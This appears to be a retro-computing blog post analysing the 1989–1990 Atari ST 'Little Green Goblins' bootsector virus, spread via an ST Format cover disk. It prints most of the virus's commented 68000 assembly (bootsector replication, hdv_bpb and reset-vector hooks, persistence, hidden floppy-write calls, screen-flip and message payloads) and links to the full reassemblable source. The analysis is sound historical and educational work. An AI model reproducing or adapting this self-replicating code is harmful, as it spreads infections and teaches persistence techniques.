Title: The Little Green Goblins Virus
Slug: GoblinVirus
Date: 2024-09-01 12:16
Modified: 2024-08-18 22:44
Location: Montreal / Canada
Category: Atari ST, Virus
Lang: en
Author: shazz
Summary: Attack of little goblins
status: published

## Introduction

This time, let's study a fun, and relatively harmless after all (but may overwrite existing executable bootsectors), virus called The Little Green Goblins Virus. This one was massively spread thanks to a UK Atari Magazine, ST Format, as its cover disk of December 1990 was infected by the almighty green goblins.... 


## High level specs

To summarize and before going into the details, here are the main characteristics of the Little Green Goblins Virus:

 - **executable bootsector** virus
 - Limited **stealth execution at boot** using an undocumented technique
 - protects itself against overwriting
 - Resists to warm reset using **RESVECTOR**
 - replaces the original **HDV_BPB vector**
 - replicates itself on bootsectors which don't have its own signature and on any floppy drive units only.
 - activates symptoms after the 3rd copy (Y-inverse the GEM menu) then after 115 copies (show a message then crashes)

## The details

As you read in the details, nothing really new but this time the symptoms part are little more fun and elaborated.

### The Loader

The Bootcode starts at 0x1E, as soon as copied in `DISKBUF` and being executed, it will

 - Patch its own JMP instruction to set the default `hdv_bpb` routine address (instead of storing the address in a variable as most viruses do), a few bytes saved.
 - Check in the target memory location  if the virus signature (`0x27182818`) is already set.
   - Note: I think there is a bug here, the code checks at `PHYSTOP` + `SIGNATURE` offset instead of `PHYSTOP`-`0x200` + `SIGNATURE` offset.
 - If not the case, virus is not yet installed in memory:
   - The virus protects itself first by patching the `PHYSTOP` system variable and decreases it of 512 bytes, where the virus will be copied
   - Then it will call the `COPY_BOOTCODE` routine to copy iself, from the `DISKBUF` to the target location (`PHYSTOP`-`0x200`)
   - Then it will set enable the `resvector` vector by setting the magic number (`RESVECTOR_MAGIC`) in `resvalid` register and the address of its own reset vector in `RESVECTOR` register.
   - Finally it will set its own HDV BPB vector into the `hdv_bpb` register.

### The `COPY_BOOTCODE` routine

Here is the code of the `COPY_BOOTCODE` which is used to copy the bootcode in upper RAM but also on floppy disks, nothing fancy, just copying 476 bytes (2 bytes more than the actual virus size) from the `DISKBUF` to a provided location in `A5`:

```asm
; ----------------------------------------------------------------------------------------------------------
; COPY_BOOTCODE
; A5: destination ptr
; ----------------------------------------------------------------------------------------------------------
COPY_BOOTCODE:
        LEA       START(PC),A1
        MOVE.W    #$ED,D0                           ; for d0 = 237 to 0
.copy:
        MOVE.W    (A1)+,(A5)+                       ; copy 238*2 bytes
        DBF       D0,.copy
        RTS
```


```asm
; ----------------------------------------------------------------------------------------------------------
; Start
; ----------------------------------------------------------------------------------------------------------
START:
        LEA       HDV_BPB_VECTOR_JMP_ADDR(PC),A0
        MOVE.L    HDV_BPB,(A0)                      ; Patch JMP call using HDV_BPB address
        MOVEA.L   PHYSTOP,A6
        LEA       COUNTER_OFFSET(A6),A5             ; Singnature is located at COUNTER+4
        MOVE.L    $4(A5),D0
        CMP.L     SIGNATURE(PC),D0                  ; Don't copy if already in memory
        BEQ.W     .done

        SUBA.L    #$200,A6                          ; protect itself by "reducing" the available
        MOVE.L    A6,PHYSTOP                        ; top free memory given by PHYSTOP
        MOVEA.L   A6,A5
        BSR.W     COPY_BOOTCODE                     ; copy bootcode to PHYSTOP-0x200

        MOVEA.L   A6,A5
        ADDA.W    #RESET_VECTOR_OFFSET,A5           ; Get reset vector ptr
        MOVE.L    #RESVECTOR_MAGIC,RESVALID.L       ; Set magic number
        MOVE.L    A5,RESVECTOR.L                    ; Set new reset vectir
        ADDA.W    #HDV_BPB_VECTOR_OFFSET,A6

        MOVE.L    A6,HDV_BPB.L                      ; Set new hdv_bpb vector
.done:
        RTS
```

Located further in the code:

```asm
; ----------------------------------------------------------------------------------------------------------
; SIGNATURE: used to check if the virus is in the bootsector or in upper ram
; ---------------------------------------------------------------------------------------------------------- 
SIGNATURE:
        DC.L      $27182818

```

### The HDV_BPB vector

Now that the virus is installed in memory, it will wait any call to BIOS `Getbpb()` which retrieves the `BPB` (Bios Parameter Block) of the floppy disk. So called at pretty any access to the floppy drive.
This vector will:

 - Get first and only param of `Getbpb(dev)` to identify the drive unit. And continue only if this is < 2, meaning 0 (A:) or 1 (B:) to exclude hard drives.
 - Then read the bootsector of `dev` using an helper `FLOP_HELPER`
 - If no read error and if the virus signature is not in the bootsector (same check as for the copy in upper RAM):
   - Bootsector will be patched: 
     - branch added at start
     - bootcode will be copied using previously describe `COPY_BOOTCODE` routine
     - magic word checksum (`$1234`) adjusted
   - Bootsector will be then written back using again the `FLOP_HELPER`
  - Now, interesting part, this where it is checked if symptoms should occur or not:
    - The virus manages a `COUNTER` variable which is incremented at this point, so after any replication.
    - Please not that on the version of the virus I found, this counter is initialized in the bootcode with the value 0x0D (13)
    - If the `COUNTER` reaches 128 (so in fact after 115 replications), the `SHOW_MESSAGE` routine will be called.
    - If the `COUNTER` reaches 16 (so in fact after 3 replications), the reset vector code will use the `VRAM_PTR` register to access the video buffer
      - Loop on the first 4 lines (`(NB_LINES/2)`) and copy backward the 160 bytes/line that contains the bitplane data from `VRAM` + `(NB_LINES*160)`
      - So basically it will Y-reverse the top 8 lines of the screen, that's exactly the GEM menu location
  - Finally it will jumped to the patched original `hdv_bpb` vector location.

```asm
; ----------------------------------------------------------------------------------------------------------
; HDV_BPB_VECTOR
; ---------------------------------------------------------------------------------------------------------- 
HDV_BPB_VECTOR:
        MOVE.W    $4(sp),D0                         ; first param of Getbpb(dev)
        CMP.W     #$2,D0                            ; if 2 => harddrive, do nothing, continue to old vector
        BGE.W     JUMP_TO_OLD_VECTOR

        MOVEM.L   D0/D1/D2/D3/D4/D5/D6/D7/A0/A1/A2/A3/A4/A5/A6,-(sp)

        ; Read bootsector
        MOVEQ     #1,D6                             ; D6 = count
        MOVE.W    D0,D7                             ; D7 = dev
        MOVEQ     #8,D5                             ; D5 = 8 => FLOPRD
        BSR.W     FLOP_HELPER
        TST.L     D0                                ; if error, do nothing
        BMI.W     DO_NOTHING
        
        ; Check if virus signature is there
        LEA       COUNTER_ADDR(A6),A5               ; A6 is used as FLOPRD bufer
        MOVE.L    $4(A5),D0                         ; if signature in FLOPRD buffer, do nothing, SIGNATURE is located at COUNTER_ADDR+4
        CMP.L     SIGNATURE(PC),D0
        BEQ.W     DO_NOTHING

        ; Patch boosector
        MOVE.W    #BOOTSECTOR_START,(A6)            ; Add branch
        LEA       $1E(A6),A5                        ; A5: destination pointer = bootcode location in buffer
        BSR.W     COPY_BOOTCODE
        MOVEA.L   A6,A5
        MOVE.W    #$FE,D1                           ; for d1 = 254 to 0
        MOVE.W    #BOOT_CHK,D0
.calc_boot_checksum:
        SUB.W     (A5)+,D0                          ; compute word checksum
        DBF       D1,.calc_boot_checksum
        MOVE.W    D0,(A5)                           ; set checksum 

        ; Write bootsector
        MOVEQ     #9,D5                             ; D9 = FLOPWR
        BSR.W     FLOP_HELPER
        TST.L     D0                                ; error ?
        BMI.W     DO_NOTHING

        ; Check if time for symptoms
        LEA       COUNTER(PC),A0                    ; get counter in upper ram
        ADDQ.L    #1,(A0)
        MOVE.L    (A0),D0
        ANDI.W    #$7F,D0                           ; if counter == 128
        BEQ.W     SHOW_MESSAGE                      ; show message (And crashes due to BRA)

        MOVE.L    (A0),D0                           
        ANDI.W    #$F,D0                            ; if counter != 16
        BNE.W     DO_NOTHING                        ; do nothing, else....  

        ; Y reverse GEM top menu
        MOVEA.L   VRAM_PTR,A0                       ; get Video RAM ptr in A0
        MOVEA.L   A0,A1                             ; A1 = A0
        ADDA.W    #$A0*NB_LINES,A1                  ; A1 = VRAM[NB_LINES*160] => NB_LINES th line
        MOVEA.L   DISKBUFP,A6                       ; A6 = floppy buffer
        MOVEQ     #(NB_LINES/2)-1,D0                ; for D0 = NB_LINES/2 to 0, stop at half Y
.loop:
        MOVEA.L   A0,A2                             
        MOVEA.L   A1,A3
        MOVEQ     #7,D1                             ; for D1 = 7 to 0 => 8 times to finish the line
.one_row_loop:
        MOVEM.L   (A2),D2/D3/D4/D5/D6               ; invert 5*4 20 bytes of VRAM[i] to VRAM[NBL_LINES*160-i] 
        MOVEM.L   D2/D3/D4/D5/D6,(A6)
        MOVEM.L   (A3),D2/D3/D4/D5/D6
        MOVEM.L   D2/D3/D4/D5/D6,(A2)
        MOVEM.L   (A6),D2/D3/D4/D5/D6
        MOVEM.L   D2/D3/D4/D5/D6,(A3)
        ADDA.W    #$14,A2                           ; advance VRAM[i] of 20 bytes                          
        ADDA.W    #$14,A3                           ; advance VRAM[NBL_LINES*160-i] of 20 bytes   
        DBRA      D1,.one_row_loop

        ADDA.W    #$A0,A0                           ; next VRAM line (160 bytes)
        SUBA.W    #$A0,A1                           ; previous VRAM line
        DBF       D0,.loop                          ; do it 4 times

DO_NOTHING:
        MOVEM.L   (sp)+,D0/D1/D2/D3/D4/D5/D6/D7/A0/A1/A2/A3/A4/A5/A6
JUMP_TO_OLD_VECTOR:
        JMP       $FC0FCA                           ; will be patched to contain new hdv_bpb vector address

; ----------------------------------------------------------------------------------------------------------
; COUNTER: symptoms counter
; trigger screen mess at 16 and message and bombs at 128 (if set at 0)
; ---------------------------------------------------------------------------------------------------------- 
COUNTER:
        DC.L      COUNTER_START_VALUE

```

### The `FLOP_HELPER` routine

The `FLOP_HELPER` routine is used to manage read or write data to the bootsector. Having this routine saves some space as this code is used 2 times in the `hdv_bpb` vector but also to hide to antivirus scanning statically the code the fact it uses `FLOPRD` and `FLOPWR` XBIOS functions, typical calls done by a virus. It only tells an XBIOS function is called but the opcode are provided as params.
Nevertheless, the buffer is not "obfuscated", `DISKBUFP` which may give a huge clue to any antivirus.

```asm
; ----------------------------------------------------------------------------------------------------------
; FLOP_HELPER: wrapper to reuse and hide trap calls
; D5 = FLOPRD or FLOPWR
; D6 = count
; D7 = dev
; ---------------------------------------------------------------------------------------------------------- 
FLOP_HELPER:
        MOVE.W    D6,-(sp)                          ; count = D6
        CLR.L     -(sp)                             ; side = 0 | track = 0
        MOVE.W    D6,-(sp)                          ; sector = D6
        MOVE.W    D7,-(sp)                          ; dev = D7
        CLR.L     -(sp)                             ; rervd = 0
        MOVEA.L   DISKBUFP,A6                       ; A6 = DISKBUFP
        MOVE.L    A6,-(sp)                          ; buf = DISKBUFP
        MOVE.W    D5,-(sp)                          ; FLOPRD or FLOPWR
        TRAP      #14                                ; Xbios
        ADDA.W    #20,sp                            ; fix stack       
        RTS
```

### The `SHOW_MESSAGE` routine:

The `SHOW_MESSAGE` routine is the routine called if 115 copies are counted, it used the GEMDOS `VOID Cconws( str )` function to print a 0-terminated string on screen. In this case it will simply writes: `The Little Green Goblins Strike Again`... so the name of the virus :)

Then it will go back to the end of the `hdv_bpb` , `BRA.W DO_NOTHING` which crashes. I did not fully understand yet why, I guess some data or address registers where trashed as none are saved before the call.

```asm
; ----------------------------------------------------------------------------------------------------------
; SHOW_MESSAGE
; ----------------------------------------------------------------------------------------------------------        
SHOW_MESSAGE:
        PEA       MESSAGE(PC)                       ; str = MESSAGE
        MOVE.W    #$9,-(sp)                         ; void CCONWS( str ), show message on screen
        TRAP      #1                                ; 
        ADDQ.L    #6,sp                             ; fix stack

        BRA.W     DO_NOTHING                        ; going back to HDV_BPB_VECTOR end part, not sure why it crashes

; ----------------------------------------------------------------------------------------------------------
; 
; ---------------------------------------------------------------------------------------------------------- 
MESSAGE:
        DC.B      'The Little Green Goblins Strike Again',0

```

### The reset vector

As installed by the loader, the "legal" reset vector will by called by the TOS after a warm reset.
The `RESET_VECTOR` routine will:
 
 - Load the `PATCHED_ROUTINE` routine as a template
 - Set at `PHYSTOP`-`0x8200` (`0xF7E00` on 1MB ST) the required header of the undocumented reset routine: `RESIDENT_MAGIC` then the routine address itself
 - Copy this routine
 - Patch the $0 value of `MOVE.L #$0,HDV_BPB` with the HDV_BPB_VECTOR address in upper RAM
 - Compute and adjust the required double page checksum `RESIDENT_CHK` (`0x5678`)
 - Go back to `TOS_MEMINIT` routine

So, as you can see, the reset vector will only set the stealth memory resistant routine to perform a simple action, set again the `hdv_hpb` vector.
I don't really see the advantage of doing that compared to simply set the `hdv_bpb` vector in the reset vector. There is maybe a good reason but I did not find it yet.

```asm
; ----------------------------------------------------------------------------------------------------------
; At reset, this routine will set up the resident program to be executed at boot (then cleaned by TOS)
; Not clear what it does....
; ---------------------------------------------------------------------------------------------------------- 
RESET_VECTOR:
        LEA       PATCHED_ROUTINE(PC),A0            ; routine ptr
        MOVEA.L   PHYSTOP,A1                        ; A1 = PHYSTOP
        SUBA.L    #$8200,A1                         ; A1 = PHYSTOP - 0x8200 = 0xF7E00 on 1MB ST
        MOVEA.L   A1,A2                             ; A2 = A1
        MOVE.L    #RESIDENT_MAGIC,(A1)+             ; Set Magic number in A1
        MOVE.L    A2,(A1)+                          ; Then routine address as expected by undocumented TOS feature
        
        LEA       HDV_BPB_VECTOR_OFFSET(PC),A6      ; A6 = hdv_bpb new vector ptr

        ; Define the content to be executed at boot: set the new hdv_bpb vector and that's it
        ;   MOVE.L    #HDV_BPB_VECTOR_ADDR,HDV_BPB
        ;   RTS
        ;   DC.L $0
        MOVE.W    (A0)+,(A1)+                       ; copy PATCHED_ROUTINE MOVE.L opcode, 2 bytes
        ADDQ.W    #4,A0                             ; skip value (0)
        MOVE.L    A6,(A1)+                          ; copy new hdv_bpb address => 4 bytes
        MOVE.L    (A0)+,(A1)+                       ; copy HDV_BPB then RTS => 4 bytes
        MOVE.L    (A0)+,(A1)                        ; then DC.L $0 => 4 bytes  => 4+4+4+2 = 14 bytes patched. Not sure what is the goal of the DC.L $0
        
        CLR.W     D0                                ; clear d0
        MOVE.W    #$FF,D1                           ; for d1 = 255 to 0
        MOVE.W    #RESIDENT_CHK,D2
.calc_resident_checksum:
        ADD.W     (A2)+,D0                          ; compute word checksum
        DBF       D1,.calc_resident_checksum
        SUB.W     D0,D2                             ; adjust checksum
        MOVE.W    D2,$2(A1)                         ; write checksum

        JMP       TOS_MEMINIT                       ; go back to TOS

; ----------------------------------------------------------------------------------------------------------
; PATCHED_ROUTINE to be installed on reset routine: 14 bytes
; ---------------------------------------------------------------------------------------------------------- 
PATCHED_ROUTINE:
        MOVE.L    #$0,HDV_BPB                       ; $0 will be patched by RESET_VECTOR to be HDV_BPB_VECTOR_ADDR
        RTS
        DC.L      $00000000                         ; ???? Useless?

```

## Conclusion

For a virus which appeared in 1989, it did not bring nothing especially new and reused what has been seen in multiple viruses before, the undocumented stealth and reset resistant routine (not used for much), a reset vector, a `hdv_bpb` vector, some limited obfuscation of the XBIOS calls and overwritting protection (`PHYSTOP` patching) and... a clear text message.

What was really more interesting was the video RAM Y-inversion routine (which takes 46 bytes so 10% of the virus bootcode total size)

As usual, you can download the full commented, and tested identical to the original virus after assembling with [vasm](http://www.compilers.de/vasm.html) here: [GOBLIN.S]({attach}sources/GOBLIN.S)


## Appendices

### Fun facts

 - In the UVK book, there is a few mistakes (at least for the virus version I found) in the description:
   - `What can happen: It puts the message "The Green Goblins Strike Again" on the screen; it can also mess up the display.`: It doesn't really mess up with the display, or at least it is not ransom at all, that's really to turn upside down the GEM menu. Not that it doesn't work well on high resolution as one line uses 80 bytes and not 160 bytes.
    - `When does that happen: The message appears after 128 copies of itself have been made; messing up of the display happens after 16 copies of itself have been made.`: that would be true if the default counter value would be 0. But in the versions I found, it was always initialized at 13.
 - As said in the intro, this virus was found on the bootsector of the ST Format UK cover disk which helped a lot its spread for sure! 
 - As you can see in the commented code, I used some constants to define how many lines should be inverted so you can change the value and invert the whole screen! I guess the virus author did not do that because the screen is inverted only one time so when the GEM is refreshed (by updated components), it doesn't stay inverted. That could have been fun to keep this behavior in a VBL routine :) 

### Still to do

 - I need to check the buggy code on the memory replication
 - I need to understand the real value of the undocumented resident routine
 - I need to understand why the `SHOW_MESSAGE` crashes after displaying the message. I have read it only happens if the ST has more than 1MB installed.
 - I was wondering if the virus signature (`0x27182818`) has a meaning... not found yet.


## Run the virus!

{% from '/html/macros/emulator.html' import emulator %}
{{ emulator("GOBLIN") }}